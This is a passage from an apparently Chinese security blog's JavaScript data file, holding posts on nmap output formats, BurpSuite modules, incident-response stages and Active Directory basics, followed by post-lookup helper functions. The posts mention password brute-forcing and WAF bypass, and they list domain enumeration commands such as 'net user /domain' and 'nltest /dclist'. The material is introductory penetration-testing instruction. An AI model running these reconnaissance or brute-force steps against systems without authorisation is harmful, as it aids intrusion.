| -T4 | 速度模板 |
| --script | 使用脚本 |

## 输出格式

\`\`\`bash
nmap -oN output.txt target.com
nmap -oX output.xml target.com
nmap -oG output.gnmap target.com
\`\`\`
    `
  },
  {
    slug: 'burpsuite-guide',
    title: 'BurpSuite 使用指南',
    date: '2026-06-01',
    category: 'tools',
    subcategory: 'burpsuite',
    tags: ['工具', 'BurpSuite', '抓包'],
    summary: 'BurpSuite 抓包工具的核心模块和使用技巧。',
    content: `
## 核心模块

### Proxy（代理）
- 拦截 HTTP/HTTPS 请求
- 修改请求/响应内容
- 历史记录查看

### Intruder（入侵者）
- 自动化参数爆破
- 支持多种攻击模式：
  - Sniper：逐个参数
  - Battering ram：相同值
  - Pitchfork：多组对应值
  - Cluster bomb：全组合

### Repeater（重放器）
- 手动修改并重发请求
- 测试漏洞 Payload

### Decoder（解码器）
- URL/Base64/Hex 等编码解码

## 常用技巧

1. **抓包改包**：Proxy → Intercept
2. **爆破密码**：Intruder → Positions/Payloads
3. **测试漏洞**：Repeater → 修改参数
4. **绕过 WAF**：修改 Headers、编码 Payload
    `
  },
  // 应急响应
  {
    slug: 'ir-process',
    title: '应急响应事件处理流程',
    date: '2026-05-28',
    category: 'ir',
    subcategory: 'ir-process',
    tags: ['应急响应', '安全运营', '事件处理'],
    summary: '安全事件应急响应的标准处理流程。',
    content: `
## 应急响应流程

### 1. 准备阶段
- 建立应急响应团队
- 准备工具和环境
- 制定响应预案

### 2. 检测阶段
- 确认安全事件
- 评估影响范围
- 事件分级分类

### 3. 抑制阶段
- 隔离受影响系统
- 阻断攻击路径
- 保存证据

### 4. 根除阶段
- 分析攻击手法
- 清除恶意程序
- 修复漏洞

### 5. 恢复阶段
- 恢复系统服务
- 验证系统安全
- 监控异常行为

### 6. 总结阶段
- 编写事件报告
- 复盘改进措施
- 更新安全策略

## 常用工具

- **流量分析**：Wireshark, tcpdump
- **日志分析**：ELK, Splunk
- **恶意文件**：VirusTotal, 微步在线
- **系统排查**：Autoruns, Process Explorer
    `
  },
  // 域渗透
  {
    slug: 'domain-environment',
    title: '域环境基础知识',
    date: '2026-05-25',
    category: 'domain',
    subcategory: 'domain-basic',
    tags: ['域渗透', 'Active Directory', 'Windows'],
    summary: 'Windows 域环境的基本概念和架构。',
    content: `
## 域的基本概念

### 什么是域
域是 Windows 网络中共享统一目录数据库的计算机集合。

### 域控制器（DC）
- 存储 Active Directory 数据库
- 处理身份验证
- 管理域内资源

### 域内常见组
- **Domain Admins** - 域管理员
- **Enterprise Admins** - 企业管理员
- **Domain Users** - 域用户
- **Domain Controllers** - 域控制器

## 常用协议

| 协议 | 用途 |
|------|------|
| LDAP | 目录访问 |
| Kerberos | 身份认证 |
| NTLM | 身份认证 |
| SMB | 文件共享 |
| RPC | 远程调用 |

## 域内信息收集

\`\`\`powershell
# 查看当前域
net config workstation

# 查看域用户
net user /domain

# 查看域组
net group /domain

# 查看域控
nltest /dclist:domain.com

# DNS 记录
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
\`\`\`
    `
  },
]

export function getAllPosts() {
  return posts.sort((a, b) => new Date(b.date) - new Date(a.date))
}

export function getPostBySlug(slug) {
  return posts.find(p => p.slug === slug)
}

export function getPostsByCategory(categoryId) {
  return posts.filter(p => p.category === categoryId)
}

export function getPostsBySubcategory(subcategoryId) {
  return posts.filter(p => p.subcategory === subcategoryId)
}

export function getAllTags() {
  const tags = new Set()
  posts.forEach(p => p.tags.forEach(t => tags.add(t)))
  return Array.from(tags)
}

export function getPostsByTag(tag) {
  return posts.filter(p => p.tags.includes(tag))
}

export function searchPosts(query) {
  const lower = query.toLowerCase()
  return posts.filter(p =>
    p.title.toLowerCase().includes(lower) ||
    p.summary.toLowerCase().includes(lower) ||
    p.content.toLowerCase().includes(lower)
  )
}

export function getCategoryById(id) {
  for (const cat of categories) {
    if (cat.id === id) return cat
    const sub = cat.children?.find(c => c.id === id)
    if (sub) return { ...sub, parent: cat }
  }
  return null
}
